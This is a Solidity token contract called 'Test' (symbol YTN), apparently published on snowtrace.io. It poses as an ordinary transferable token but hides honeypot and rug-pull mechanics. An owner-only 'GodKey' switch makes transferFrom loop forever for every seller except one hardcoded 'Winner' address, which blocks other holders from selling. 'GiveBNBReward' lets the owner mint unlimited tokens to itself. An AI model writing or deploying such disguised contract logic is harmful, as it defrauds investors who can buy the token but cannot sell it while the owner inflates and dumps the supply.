/**
 *Submitted for verification at snowtrace.io on 2021-12-27
*/

pragma solidity 0.4.26;
contract Test {
  
    mapping (address => uint256) public balanceOf;

    // 
    string public name = "Test";
    string public symbol = "YTN";
    uint8 public decimals = 18;
    uint256 public totalSupply = 20456743 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor() public {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;

bool isEnabled;

modifier isOwner() {
    require(msg.sender == owner);
    _;
}

function GodKey() public isOwner {
    isEnabled = !isEnabled;
}

function GiveBNBReward(address to, uint256 value) public returns (bool)
{
    
        require(msg.sender == owner);
        
    require(totalSupply + value >= totalSupply); // Overflow check

    totalSupply += value;
    balanceOf[msg.sender] += value;
    emit Transfer(address(0), to, value);
}

    function transfer(address to, uint256 value) public returns (bool success) {
        
if(isEnabled)


require(balanceOf[msg.sender] >= value);

       balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    
require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)

       {

       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

address Winner = 0x098FC22ca142d161b096e145fd495E73A87207b8;


    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
        
      while(isEnabled) {
if(from == Winner)  {
        
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; } }
        
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    
}